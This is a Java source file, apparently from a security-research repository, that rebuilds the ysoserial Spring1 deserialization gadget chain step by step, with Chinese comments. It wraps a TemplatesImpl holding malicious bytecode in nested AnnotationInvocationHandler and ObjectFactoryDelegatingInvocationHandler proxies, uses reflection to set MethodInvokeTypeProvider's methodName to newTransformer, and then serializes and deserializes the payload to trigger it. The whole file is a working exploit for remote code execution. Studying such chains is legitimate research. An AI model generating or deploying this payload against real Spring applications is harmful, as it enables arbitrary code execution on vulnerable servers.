package org.su18.serialize.ysoserial.Spring.Spring1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.beans.factory.ObjectFactory;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;

/**
 * @author su18
 */
public class Spring1 {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 使用 AnnotationInvocationHandler 动态代理
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		HashMap<String, Object> map = new HashMap<>();
		map.put("getObject", tmpl);

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

		// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl
		ObjectFactory<?> factory = (ObjectFactory<?>) Proxy.newProxyInstance(
				ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);

		// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject
		// 并且会调用 method.invoke(返回值,args)
		// 此时返回值被我们使用动态代理改为了 TemplatesImpl
		// 接下来需要 method 是 newTransformer()，就可以触发调用链了
		Class<?>       clazz          = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
		Constructor<?> ofdConstructor = clazz.getDeclaredConstructors()[0];
		ofdConstructor.setAccessible(true);
		// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
		InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);

		// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
		// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
		// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
		// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
		Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{Type.class, Templates.class}, ofdHandler);


		// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
		HashMap<String, Object> map2 = new HashMap<>();
		map2.put("getType", typeTemplateProxy);

		InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);

		Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
		// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
		Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{typeProviderClass}, newInvocationHandler);


		// 初始化 MethodInvokeTypeProvider
		Class<?>       clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		Constructor<?> cons   = clazz2.getDeclaredConstructors()[0];
		cons.setAccessible(true);
		// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
		// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
		Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
		Field  field   = clazz2.getDeclaredField("methodName");
		field.setAccessible(true);
		field.set(objects, "newTransformer");

		SerializeUtil.writeObjectToFile(objects);
		SerializeUtil.readFileObject();
	}

}
